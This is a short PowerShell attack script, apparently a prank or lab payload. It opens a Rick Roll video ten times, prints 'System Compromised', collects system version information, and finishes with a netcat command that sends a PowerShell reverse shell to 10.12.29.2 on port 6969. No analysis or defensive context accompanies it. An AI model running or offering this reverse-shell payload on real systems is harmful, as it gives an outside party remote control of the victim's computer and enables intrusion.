Start-Sleep -Seconds 2

Write-Output "Rick Roll"

Start-Sleep -Seconds 1

for ($i = 1; $i -le 10; $i++) { Start-Process https://www.youtube.com/watch?v=dQw4w9WgXcQ}

Start-Sleep -Seconds 2

Write-Output "System Compromised"

Start-Sleep -Seconds 2

Write-Output "Get system information"

Start-Sleep -Seconds 2

Get-ComputerInfo -Property "*version"

Start-Sleep -Seconds 2

Write-Output "Get reverse shell"

Start-Sleep -Seconds 2

nc -e pwsh.exe 10.12.29.2 6969



